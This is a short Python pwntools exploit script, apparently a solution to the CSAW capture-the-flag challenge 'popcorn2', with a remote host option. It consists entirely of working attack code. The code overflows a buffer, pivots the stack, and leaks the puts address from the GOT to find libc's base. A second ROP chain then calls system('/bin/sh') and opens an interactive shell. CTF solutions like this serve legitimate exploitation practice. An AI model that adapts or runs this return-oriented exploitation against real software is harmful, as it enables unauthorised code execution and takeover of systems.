from pwn import *

e = ELF("./popcorn2")
libc = ELF("./libc.so.6")

context.binary = e.path

if "--remote" in sys.argv:
  p = remote("pwn.chal.csaw.io", 1004)
else:
  p = process(e.path
  )
  #{"LD_PRELOAD": libc.path})



p.recvuntil("?")

base = 0x404800
p.send("A" * 0x80 + p64(base) + p64(e.symbols["get_pop"] + 4))
p.send((p64(0x40123b) + p64(e.got["puts"]) + p64(e.symbols["puts"]) + (p64(0x401239) + p64(base - 0x30) + p64(0x1337) + p64(0x40123b) + p64(0) + p64(e.symbols["read"])) * 2).ljust(0x80, "\x00") + p64(base - 0x80 - 8) + p64(0x401182))
p.sendline()

p.recvuntil("AAAAAAAAA")
p.recvline()
p.recvline()

base = u64(p.recvline(keepends=False).ljust(8, "\x00")) - libc.symbols["puts"]
print("{:#x}".format(base))

p.sendline("A" * 6 + p64(0x1337) * 0x1d + p64(0x40123b) + p64(base + next(libc.search("/bin/sh"))) + p64(base + libc.symbols["system"]))

p.interactive()
